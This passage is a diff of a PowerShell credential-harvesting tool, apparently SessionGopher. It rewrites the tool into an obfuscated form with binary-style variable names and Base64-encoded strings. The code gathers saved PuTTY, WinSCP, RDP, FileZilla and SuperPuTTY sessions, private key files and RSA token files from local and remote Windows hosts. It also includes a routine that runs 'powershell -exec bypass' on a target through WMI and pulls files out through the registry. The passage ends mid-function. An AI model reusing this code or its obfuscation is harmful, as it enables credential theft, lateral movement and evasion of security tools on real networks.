-      if ($hdPXEKUQjxCYg9C) {
-
-        $uTLibPDMibhEOhJ = New-Object System.Collections.ArrayList
-        $NpEpKAllBWZHx9K = New-Object System.Collections.ArrayList
-        $aLapaagzarVqLxc = New-Object System.Collections.ArrayList
-
-        $yXnrckb99GbxRtw = (Get-WmiObject -Class 'CIM_DataFile' -Filter "Drive='C:' AND extension='ppk' OR extension='rdp' OR extension='.sdtid'" -ComputerName $FihclsuUejmorCq @optionalCreds | Select Name)
-
-        (ProcessThoroughRemote $yXnrckb99GbxRtw)
-        
+        if (${01011001010011001}.Name) { ${_01011100110011110} = 
+          $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwA6AFwAVQBzAGUAcgBzAFwAJAB7ADAAMAAxADEAMAAxADAAMQAwADEAMQAxADEAMQAxADEAMQB9AFwAQQBwAHAARABhAHQAYQBcAFIAbwBhAG0AaQBuAGcAXABGAGkAbABlAFoAaQBsAGwAYQBcAHMAaQB0AGUAbQBhAG4AYQBnAGUAcgAuAHgAbQBsAA=='))) 
+          ${01100111110001000} = _10000010000000010 ${_01011100110011110} [xml]${_01110110011100001} = ${01100111110001000} (_01111010001110000 ${_01110110011100001})
+        } 
       } 
-
-    } # for each remote computer
-
-
-  } else { 
-    
-    Write-Host -NoNewLine -ForegroundColor "DarkGreen" "[+] "
-    Write-Host "Digging on"(Hostname)"..."
-
-
-    $DCLgvNccmWWXnTl = Get-ChildItem Registry::HKEY_USERS\ -ErrorAction SilentlyContinue | Where-Object {$_.Name -match '^HKEY_USERS\\S-1-5-21-[\d\-]+$'}
-
-
-    foreach($Hive in $DCLgvNccmWWXnTl) {
-
-
-      $V9joSisJDLQPInP = New-Object PSObject
-
-      $d9zjC9MrnEqjuDK = New-Object System.Collections.ArrayList
-      $syHqDrMywPTJprj = New-Object System.Collections.ArrayList
-      $uTLibPDMibhEOhJ = New-Object System.Collections.ArrayList
-      $muzrifeMsMRPGSl = New-Object System.Collections.ArrayList
-      $vPIjdrTXjYCbuew = New-Object System.Collections.ArrayList
-      $NpEpKAllBWZHx9K = New-Object System.Collections.ArrayList
-      $EpFdJVExPKHuYcZ = New-Object System.Collections.ArrayList
-
-      $d9kmwKdh9qsomvT = (beanbag)
-      $9dmptIQvAWIrBtO = (Hostname) + "\" + (Split-Path $d9kmwKdh9qsomvT.Value -Leaf)
-
-      $V9joSisJDLQPInP | Add-Member -MemberType NoteProperty -Name "Source" -Value $d9kmwKdh9qsomvT.Value
-
-
-      $XDXyugGv9xkQpXo = Join-Path $Hive.PSPath "\$YmFMtBsKII9ePhI"
-      $azNsPQOqGFMOGlD = Join-Path $Hive.PSPath "\$hUAQiRXSTz9NfCo"
-      $hmTCBceZuxNuAnN = Join-Path $Hive.PSPath "\$9JUuYMtpnTYQPMX"
-      $Gdvlx9HnRHgAfUb = "C:\Users\" + (Split-Path -Leaf $V9joSisJDLQPInP."Source") + "\AppData\Roaming\FileZilla\sitemanager.xml"
-      $Kdi9ilat9ZJmRDb = "C:\Users\" + (Split-Path -Leaf $V9joSisJDLQPInP."Source") + "\Documents\SuperPuTTY\Sessions.xml"
-
-      if (Test-Path $Gdvlx9HnRHgAfUb) {
-
-        [xml]$DnZtKlK9NayrWx9 = Get-Content $Gdvlx9HnRHgAfUb
-        (ProcessFileZillaFile $DnZtKlK9NayrWx9)
-
-      }
-
-      if (Test-Path $Kdi9ilat9ZJmRDb) {
-
-        [xml]$VhtJEeNXNsVmvvQ = Get-Content $Kdi9ilat9ZJmRDb
-        (ProcessSuperPuTTYFile $VhtJEeNXNsVmvvQ)
-
-      }
-
-      if (Test-Path $hmTCBceZuxNuAnN) {
-
-
-        $9lSMYGpcztGkGnz = Get-ChildItem $hmTCBceZuxNuAnN
-
-        (ProcessRDPLocal $9lSMYGpcztGkGnz)
-
-      } # If (Test-Path MicrosoftRDPPath)
-
-      if (Test-Path $azNsPQOqGFMOGlD) {
-
-
-        $VTxZ9WXqTI99p9H = Get-ChildItem $azNsPQOqGFMOGlD
-
-        (ProcessWinSCPLocal $VTxZ9WXqTI99p9H)
-
-      } # If (Test-Path WinSCPPath)
-      
-      if (Test-Path $XDXyugGv9xkQpXo) {
-
-
-        $nEz9BqLfCLksBaQ = Get-ChildItem $XDXyugGv9xkQpXo
-
-        (ProcessPuTTYLocal $nEz9BqLfCLksBaQ)
-
-      } # If (Test-Path PuTTYPath)
-
-    } # For each Hive in UserHives
-
-
-    if ($hdPXEKUQjxCYg9C) {
-
-
-      $YtRxwozAYQBG9wb = New-Object System.Collections.ArrayList
-      $eWNrJqqNTZjoBak = New-Object System.Collections.ArrayList
-      $YJbRCYRyMeA9xLO = New-Object System.Collections.ArrayList
-
-
-      $Y9ZdFBS9qGEzwvw = Get-PSDrive
-
-      (ProcessThoroughLocal $Y9ZdFBS9qGEzwvw)
-      
-      (ProcessPPKFile $YtRxwozAYQBG9wb)
-      (ProcessRDPFile $eWNrJqqNTZjoBak)
-      (ProcesssdtidFile $YJbRCYRyMeA9xLO)
-
-    } # If Thorough
-
-  } # Else -- run SessionGopher locally
-
-} # cachet
-
-
-
-
-
-
-
-
-function beanbag {
-
-
-  if ($iL -or $p9REFRiCCsuC9In -or $qMELeoMyJPUTJQY) {
-
-    $nzsFlXYuyXYxvmm = "SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\$SID"
-    $Value = "ProfileImagePath"
-
-    return (Invoke-WmiMethod -ComputerName $FihclsuUejmorCq -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $HKLM,$nzsFlXYuyXYxvmm,$Value @optionalCreds).sValue
-
+      if ($Thorough) { ${10100011010111001} = New-Object System.Collections.ArrayList ${00011101111001111} = New-Object System.Collections.ArrayList ${01110111110000000} = 
+        New-Object System.Collections.ArrayList ${_01100111100111011} = (gwmi -Class 
+        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBJAE0AXwBEAGEAdABhAEYAaQBsAGUA'))) -Filter "Drive='C:' AND extension='ppk' OR extension='rdp' OR 
+        extension='.sdtid'" -ComputerName ${10111101000001111} @10111100110010001 | Select Name) (_00111100110111100 ${_01100111100111011})
+      } 
+    } 
   } else {
-
-    $SID = (Split-Path $Hive.Name -Leaf)
-    $9CTWMwVuyDTWhyP = New-Object System.Security.Principal.SecurityIdentifier("$SID")
-    return $9CTWMwVuyDTWhyP.Translate( [System.Security.Principal.NTAccount])
+    Write-Host -NoNewLine -ForegroundColor $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHIAawBHAHIAZQBlAG4A'))) 
+    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIAA='))) Write-Host 
+    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGcAZwBpAG4AZwAgAG8AbgA=')))(Hostname)$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgAuAC4A'))) 
+    ${00111001110010111} = ls Registry::HKEY_USERS\ -ErrorAction SilentlyContinue | ? {$_.Name -match 
+    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBIAEsARQBZAF8AVQBTAEUAUgBTAFwAXABTAC0AMQAtADUALQAyADEALQBbAFwAZABcAC0AXQArACQA')))} 
+    foreach(${10000101101010100} in ${00111001110010111}) {
+      ${10000100110110100} = New-Object PSObject ${00010100001000100} = New-Object System.Collections.ArrayList ${01111101100010010} = New-Object System.Collections.ArrayList 
+      ${10100011010111001} = New-Object System.Collections.ArrayList ${01010111100000001} = New-Object System.Collections.ArrayList ${10001101110101001} = New-Object 
+      System.Collections.ArrayList ${00011101111001111} = New-Object System.Collections.ArrayList ${10111100100011001} = New-Object System.Collections.ArrayList 
+      ${00010010000000011} = (_01011000110111000) ${00111110011110111} = (Hostname) + "\" + (Split-Path ${00010010000000011}.Value -Leaf) ${10000100110110100} | Add-Member 
+      -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUA'))) -Value ${00010010000000011}.Value 
+      ${00011101000110001} = Join-Path ${10000101101010100}.PSPath 
+      $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAkAHsAMQAwADAAMQAxADEAMAAwADEAMQAwADEAMAAwADEAMAAwAH0A'))) 
+      ${01010110101100110} = Join-Path ${10000101101010100}.PSPath 
+      $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAkAHsAMQAwADAAMQAwADAAMAAxADAAMQAwADEAMQAxADAAMAAwAH0A'))) 
+      ${01111111010111001} = Join-Path ${10000101101010100}.PSPath 
+      $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAkAHsAMQAwADEAMAAwADEAMAAwADAAMAAwADEAMAAwADEAMQAwAH0A'))) 
+      ${01011001010011001} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwA6AFwAVQBzAGUAcgBzAFwA'))) + (Split-Path -Leaf ${10000100110110100}."Source") 
+      + 
+      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABBAHAAcABEAGEAdABhAFwAUgBvAGEAbQBpAG4AZwBcAEYAaQBsAGUAWgBpAGwAbABhAFwAcwBpAHQAZQBtAGEAbgBhAGcAZQByAC4AeABtAGwA'))) 
+      ${10000011010100100} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwA6AFwAVQBzAGUAcgBzAFwA'))) + (Split-Path -Leaf ${10000100110110100}."Source") 
+      + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABEAG8AYwB1AG0AZQBuAHQAcwBcAFMAdQBwAGUAcgBQAHUAVABUAFkAXABTAGUAcwBzAGkAbwBuAHMALgB4AG0AbAA='))) if 
+      (Test-Path ${01011001010011001}) {
+        [xml]${_01110110011100001} = gc ${01011001010011001} (_01111010001110000 ${_01110110011100001})
+      }
+      if (Test-Path ${10000011010100100}) { [xml]${_10100100011100010} = gc ${10000011010100100} (_01110101110100101 ${_10100100011100010})
+      }
+      if (Test-Path ${01111111010111001}) { ${_01010010110101111} = ls ${01111111010111001} (_01000111010101101 ${_01010010110101111})
+      } 
+      if (Test-Path ${01010110101100110}) { ${_01001100010111010} = ls ${01010110101100110} (_10000100100101100 ${_01001100010111010})
+      } 
+      if (Test-Path ${00011101000110001}) { ${_00000010111110000} = ls ${00011101000110001} (_01100001110111011 ${_00000010111110000})
+      } 
+    } 
+    if ($Thorough) { ${_10001100001011101} = New-Object System.Collections.ArrayList ${_00111011000101000} = New-Object System.Collections.ArrayList ${_10101111001001101} = 
+      New-Object System.Collections.ArrayList ${_01111000011111111} = gdr (_01110101011000100 ${_01111000011111111}) (_00101010010011101 ${_10001100001011101}) 
+      (_01001011101110110 ${_00111011000101000}) (_10101010000011011 ${_10101111001001101})
+    } 
+  } 
+} 
+function _01011000110111000 { if ($iL -or $Target -or $AllDomain) { ${00001011001101110} = 
+    $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAATgBUAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAUAByAG8AZgBpAGwAZQBMAGkAcwB0AFwAJAB7ADAAMQAxADAAMAAwADAAMAAwADAAMQAxADAAMQAxADAAMQB9AA=='))) 
+    ${01001100100000110} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AZgBpAGwAZQBJAG0AYQBnAGUAUABhAHQAaAA='))) return (Invoke-WmiMethod 
+    -ComputerName ${10111101000001111} -Class $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name 
+    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUwB0AHIAaQBuAGcAVgBhAGwAdQBlAA=='))) -ArgumentList 
+    ${10010111110111111},${00001011001101110},${01001100100000110} @10111100110010001).sValue
+  } else {
+    ${01100000001101101} = (Split-Path ${10000101101010100}.Name -Leaf) ${10010100001001101} = New-Object 
+    System.Security.Principal.SecurityIdentifier($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADAAMQAxADAAMAAwADAAMAAwADAAMQAxADAAMQAxADAAMQB9AA==')))) 
+    return ${10010100001001101}.Translate( [System.Security.Principal.NTAccount])
   }
-
 }
-
-function DownloadAndExtractFromRemoteRegistry($File) {
-
-
-  $cULffpwskvlFDwr = "HKLM:\Software\Microsoft\DRM"
-  $JbbUDJK9WLgCK9a = "ReadMe"
-  $TT9VqcmH9dLWosR = "SOFTWARE\Microsoft\DRM"
-          
-
-  Write-Verbose "Reading remote file and writing on remote registry"
-  $FFKsyEgNnPrUgJk = '$fct = Get-Content -Encoding byte -Path ''' + "$File" + '''; $heCvOJXTToqDjtf = [System.Convert]::ToBase64String($fct); New-ItemProperty -Path ' + "'$cULffpwskvlFDwr'" + ' -Name ' + "'$JbbUDJK9WLgCK9a'" + ' -Value $heCvOJXTToqDjtf -PropertyType String -Force'
-  $FFKsyEgNnPrUgJk = 'powershell -nop -exec bypass -c "' + $FFKsyEgNnPrUgJk + '"'
-
-  $null = Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $FFKsyEgNnPrUgJk -ComputerName $FihclsuUejmorCq @optionalCreds
-
-
-  Start-Sleep -s 15
-
-  $HjlrjPgFXfIvgoq = ""
-
-
-  $HjlrjPgFXfIvgoq = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $HKLM, $TT9VqcmH9dLWosR, $JbbUDJK9WLgCK9a -Computer $FihclsuUejmorCq @optionalCreds
-  
-  $bSivwuZeE9tNjvl = [System.Convert]::FromBase64String($HjlrjPgFXfIvgoq.sValue)
-  $iOhKinHRROeqPDZ = [System.Text.Encoding]::UTF8.GetString($bSivwuZeE9tNjvl) 
-    
-
-  $null = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $wzUAsy9Dj9WwYlQ, $TT9VqcmH9dLWosR, $JbbUDJK9WLgCK9a -ComputerName $FihclsuUejmorCq @optionalCreds
-  
-  return $iOhKinHRROeqPDZ
-
+function _10000010000000010(${_01011100110011110}) { ${10110110010000010} = 
+  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEwATQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABEAFIATQA='))) ${10101101011010111} = 
+  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABNAGUA'))) ${00111001010010010} = 
+  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABEAFIATQA='))) Write-Verbose 
+  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABpAG4AZwAgAHIAZQBtAG8AdABlACAAZgBpAGwAZQAgAGEAbgBkACAAdwByAGkAdABpAG4AZwAgAG8AbgAgAHIAZQBtAG8AdABlACAAcgBlAGcAaQBzAHQAcgB5AA=='))) 
+  ${10101000000111000} = 
+  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABmAGMAdAAgAD0AIABHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIAAtAEUAbgBjAG8AZABpAG4AZwAgAGIAeQB0AGUAIAAtAFAAYQB0AGgAIAAnAA=='))) 
+  + $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AMAAxADAAMQAxADEAMAAwADEAMQAwADAAMQAxADEAMQAwAH0A'))) + 
+  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JwA7ACAAJABmAGMAdABlAG4AYwAgAD0AIABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBUAG8AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAkAGYAYwB0ACkAOwAgAE4AZQB3AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIAA='))) 
+  + 
+  $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JwAkAHsAMQAwADEAMQAwADEAMQAwADAAMQAwADAAMAAwADAAMQAwAH0AJwA='))) 
+  + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAtAE4AYQBtAGUAIAA='))) + 
+  $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JwAkAHsAMQAwADEAMAAxADEAMAAxADAAMQAxADAAMQAwADEAMQAxAH0AJwA='))) 
+  + 
+  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAtAFYAYQBsAHUAZQAgACQAZgBjAHQAZQBuAGMAIAAtAFAAcgBvAHAAZQByAHQAeQBUAHkAcABlACAAUwB0AHIAaQBuAGcAIAAtAEYAbwByAGMAZQA='))) 
+  ${10101000000111000} = 
+  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cABvAHcAZQByAHMAaABlAGwAbAAgAC0AbgBvAHAAIAAtAGUAeABlAGMAIABiAHkAcABhAHMAcwAgAC0AYwAgACIA'))) + 
+  ${10101000000111000} + '"' $null = Invoke-WmiMethod -class win32_process -Name Create -Argumentlist ${10101000000111000} -ComputerName ${10111101000001111} 
+  @10111100110010001 sleep -s 15 ${01000111111001010} = "" ${01000111111001010} = Invoke-WmiMethod -Namespace 
+  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA'))) -Class 
+  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name 
+  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUwB0AHIAaQBuAGcAVgBhAGwAdQBlAA=='))) -ArgumentList ${10010111110111111}, ${00111001010010010}, 
+  ${10101101011010111} -Computer ${10111101000001111} @10111100110010001 ${01000101010110110} = [System.Convert]::FromBase64String(${01000111111001010}.sValue) 
+  ${10111101000111100} = [System.Text.Encoding]::UTF8.GetString(${01000101010110110}) $null = Invoke-WmiMethod -Namespace 
+  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cgBvAG8AdABcAGQAZQBmAGEAdQBsAHQA'))) -Class 
+  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGQAUgBlAGcAUAByAG8AdgA='))) -Name 
+  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQB0AGUAVgBhAGwAdQBlAA=='))) -Argumentlist $reghive, ${00111001010010010}, ${10101101011010111} 
+  -ComputerName ${10111101000001111} @10111100110010001 return ${10111101000111100}
 }
-
-
-
-
-
-
-
-function ProcessThoroughLocal($Y9ZdFBS9qGEzwvw) {
-  
-  foreach ($Drive in $Y9ZdFBS9qGEzwvw) {
-
-    if ($Drive.Provider.Name -eq "FileSystem") {
-      $Dirs = Get-ChildItem $Drive.Root -Recurse -ErrorAction SilentlyContinue
-      foreach ($Dir in $Dirs) {
-        Switch ($Dir.Extension) {
-          ".ppk" {[void]$YtRxwozAYQBG9wb.Add($Dir)}
-          ".rdp" {[void]$eWNrJqqNTZjoBak.Add($Dir)}
-          ".sdtid" {[void]$YJbRCYRyMeA9xLO.Add($Dir)}
+function _01110101011000100(${_01111000011111111}) { foreach (${00110000010111101} in ${_01111000011111111}) { if (${00110000010111101}.Provider.Name -eq 
+    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBTAHkAcwB0AGUAbQA=')))) {
+      ${00000111011010110} = ls ${00110000010111101}.Root -Recurse -ErrorAction SilentlyContinue foreach (${00001011000101110} in ${00000111011010110}) { Switch 
+        (${00001011000101110}.Extension) {
+          $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBwAHAAawA='))) {[void]${_10001100001011101}.Add(${00001011000101110})} 
+          $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgByAGQAcAA='))) {[void]${_00111011000101000}.Add(${00001011000101110})} 
+          $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBzAGQAdABpAGQA'))) {[void]${_10101111001001101}.Add(${00001011000101110})}
         }
       }
     }
   }
-
 }
-
-function ProcessThoroughRemote($yXnrckb99GbxRtw) {
-
-  foreach ($gfoUnwuwfmhBuAE in $yXnrckb99GbxRtw) {
-
-      $XtRSEeVgx9lKzKF = "" | Select-Object -Property Source,Path
-      $XtRSEeVgx9lKzKF.Source = $FihclsuUejmorCq
-
-      $jYNfAmVplYJFcLE = [IO.Path]::GetExtension($gfoUnwuwfmhBuAE.Name)
-
-      if ($jYNfAmVplYJFcLE -eq ".ppk") {
-        $XtRSEeVgx9lKzKF.Path = $gfoUnwuwfmhBuAE.Name
-        [void]$uTLibPDMibhEOhJ.Add($XtRSEeVgx9lKzKF)
-      } elseif ($jYNfAmVplYJFcLE -eq ".rdp") {
-        $XtRSEeVgx9lKzKF.Path = $gfoUnwuwfmhBuAE.Name
-        [void]$NpEpKAllBWZHx9K.Add($XtRSEeVgx9lKzKF)
-      } elseif ($jYNfAmVplYJFcLE -eq ".sdtid") {
-        $XtRSEeVgx9lKzKF.Path = $gfoUnwuwfmhBuAE.Name
-        [void]$aLapaagzarVqLxc.Add($XtRSEeVgx9lKzKF)
+function _00111100110111100(${_01100111100111011}) { foreach (${00111011111001100} in ${_01100111100111011}) { ${00000110010110111} = "" | select -Property Source,Path 
+      ${00000110010110111}.Source = ${10111101000001111} ${01111110101001011} = [IO.Path]::GetExtension(${00111011111001100}.Name) if (${01111110101001011} -eq 
+      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBwAHAAawA=')))) {
+        ${00000110010110111}.Path = ${00111011111001100}.Name [void]${10100011010111001}.Add(${00000110010110111})
+      } elseif (${01111110101001011} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgByAGQAcAA=')))) {
+        ${00000110010110111}.Path = ${00111011111001100}.Name [void]${00011101111001111}.Add(${00000110010110111})
+      } elseif (${01111110101001011} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBzAGQAdABpAGQA')))) {
+        ${00000110010110111}.Path = ${00111011111001100}.Name [void]${01110111110000000}.Add(${00000110010110111})
       }
-
   }
-
-  if ($uTLibPDMibhEOhJ.count -gt 0) {
-
-    $V9joSisJDLQPInP | Add-Member -MemberType NoteProperty -Name "PPK Files" -Value $NpEpKAllBWZHx9K
-
-    if ($o) {
-      $uTLibPDMibhEOhJ | Export-CSV -Append -Path ($zPRwy9FdrtsVRzg + "\PuTTY ppk Files.csv") -NoTypeInformation
+  if (${10100011010111001}.count -gt 0) { ${10000100110110100} | Add-Member -MemberType NoteProperty -Name 
+    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABQAEsAIABGAGkAbABlAHMA'))) -Value ${00011101111001111} if ($o) {
+      ${10100011010111001} | Export-CSV -Append -Path (${10101001001011011} + 
+      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABQAHUAVABUAFkAIABwAHAAawAgAEYAaQBsAGUAcwAuAGMAcwB2AA==')))) -NoTypeInformation
     } else {
-      Write-Output "PuTTY Private Key Files (.ppk)"
-      $uTLibPDMibhEOhJ | Format-List | Out-String
+      echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AFQAVABZACAAUAByAGkAdgBhAHQAZQAgAEsAZQB5ACAARgBpAGwAZQBzACAAKAAuAHAAcABrACkA'))) 
+      ${10100011010111001} | fl | Out-String
     }
   }
-
-  if ($NpEpKAllBWZHx9K.count -gt 0) {
-
-    $V9joSisJDLQPInP | Add-Member -MemberType NoteProperty -Name "RDP Files" -Value $NpEpKAllBWZHx9K
-
-    if ($o) {
-      $NpEpKAllBWZHx9K | Export-CSV -Append -Path ($zPRwy9FdrtsVRzg + "\Microsoft rdp Files.csv") -NoTypeInformation
+  if (${00011101111001111}.count -gt 0) { ${10000100110110100} | Add-Member -MemberType NoteProperty -Name 
+    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBEAFAAIABGAGkAbABlAHMA'))) -Value ${00011101111001111} if ($o) {
+      ${00011101111001111} | Export-CSV -Append -Path (${10101001001011011} + 
+      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABNAGkAYwByAG8AcwBvAGYAdAAgAHIAZABwACAARgBpAGwAZQBzAC4AYwBzAHYA')))) -NoTypeInformation
     } else {
-      Write-Output "Microsoft RDP Connection Files (.rdp)"
-      $NpEpKAllBWZHx9K | Format-List | Out-String
+      echo 
+      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQAIABSAEQAUAAgAEMAbwBuAG4AZQBjAHQAaQBvAG4AIABGAGkAbABlAHMAIAAoAC4AcgBkAHAAKQA='))) 
+      ${00011101111001111} | fl | Out-String
     }
   }
-  if ($aLapaagzarVqLxc.count -gt 0) {
-
-    $V9joSisJDLQPInP | Add-Member -MemberType NoteProperty -Name "sdtid Files" -Value $aLapaagzarVqLxc
-
-    if ($o) {
-      $aLapaagzarVqLxc | Export-CSV -Append -Path ($zPRwy9FdrtsVRzg + "\RSA sdtid Files.csv") -NoTypeInformation
+  if (${01110111110000000}.count -gt 0) { ${10000100110110100} | Add-Member -MemberType NoteProperty -Name 
+    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBkAHQAaQBkACAARgBpAGwAZQBzAA=='))) -Value ${01110111110000000} if ($o) {
+      ${01110111110000000} | Export-CSV -Append -Path (${10101001001011011} + 
+      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABSAFMAQQAgAHMAZAB0AGkAZAAgAEYAaQBsAGUAcwAuAGMAcwB2AA==')))) -NoTypeInformation
     } else {
-      Write-Output "RSA Tokens (sdtid)"
-      $aLapaagzarVqLxc | Format-List | Out-String
+      echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBTAEEAIABUAG8AawBlAG4AcwAgACgAcwBkAHQAaQBkACkA'))) ${01110111110000000} | fl | Out-String
     }
-
   }
-
-} # ProcessThoroughRemote
-
-function ProcessPuTTYLocal($nEz9BqLfCLksBaQ) {
-  
-
-  foreach($XqQmLH9cAzise9c in $nEz9BqLfCLksBaQ) {
-
-    $GoBWdZjNHqxctqm = "" | Select-Object -Property Source,Session,Hostname
-
-    $GoBWdZjNHqxctqm.Source = $9dmptIQvAWIrBtO
-    $GoBWdZjNHqxctqm.Session = (Split-Path $XqQmLH9cAzise9c -Leaf)
-    $GoBWdZjNHqxctqm.Hostname = ((Get-ItemProperty -Path ("Microsoft.PowerShell.Core\Registry::" + $XqQmLH9cAzise9c) -Name "Hostname" -ErrorAction SilentlyContinue).Hostname)
-
-
-    [void]$syHqDrMywPTJprj.Add($GoBWdZjNHqxctqm)
-
+} 
+function _01100001110111011(${_00000010111110000}) { foreach(${01111000010000011} in ${_00000010111110000}) { ${00001111000011010} = "" | select -Property 
+    Source,Session,Hostname ${00001111000011010}.Source = ${00111110011110111} ${00001111000011010}.Session = (Split-Path ${01111000010000011} -Leaf) 
+    ${00001111000011010}.Hostname = ((gp -Path 
+    ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQALgBQAG8AdwBlAHIAUwBoAGUAbABsAC4AQwBvAHIAZQBcAFIAZQBnAGkAcwB0AHIAeQA6ADoA'))) + 
+    ${01111000010000011}) -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAHMAdABuAGEAbQBlAA=='))) -ErrorAction SilentlyContinue).Hostname) 
+    [void]${01111101100010010}.Add(${00001111000011010})
   }
-
-  if ($o) {
-    $syHqDrMywPTJprj | Export-CSV -Append -Path ($zPRwy9FdrtsVRzg + "\PuTTY.csv") -NoTypeInformation
+  if ($o) { ${01111101100010010} | Export-CSV -Append -Path (${10101001001011011} + 
+    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABQAHUAVABUAFkALgBjAHMAdgA=')))) -NoTypeInformation
   } else {
-    Write-Output "PuTTY Sessions"
-    $syHqDrMywPTJprj | Format-List | Out-String
+    echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AFQAVABZACAAUwBlAHMAcwBpAG8AbgBzAA=='))) ${01111101100010010} | fl | Out-String
   }
-
-
-  $V9joSisJDLQPInP | Add-Member -MemberType NoteProperty -Name "PuTTY Sessions" -Value $syHqDrMywPTJprj
-
-} # ProcessPuTTYLocal
-
-function ProcessRDPLocal($9lSMYGpcztGkGnz) {
-
-
-  foreach($XqQmLH9cAzise9c in $9lSMYGpcztGkGnz) {
-
-    $gHienLOKdftmGk9 = "Microsoft.PowerShell.Core\Registry::" + $XqQmLH9cAzise9c
-
-    $XwBbJ9GgChBoYK9 = "" | Select-Object -Property Source,Hostname,Username
-
-    $XwBbJ9GgChBoYK9.Source = $9dmptIQvAWIrBtO
-    $XwBbJ9GgChBoYK9.Hostname = (Split-Path $XqQmLH9cAzise9c -Leaf)
-    $XwBbJ9GgChBoYK9.Username = ((Get-ItemProperty -Path $gHienLOKdftmGk9 -Name "UsernameHint" -ErrorAction SilentlyContinue).UsernameHint)
-
-
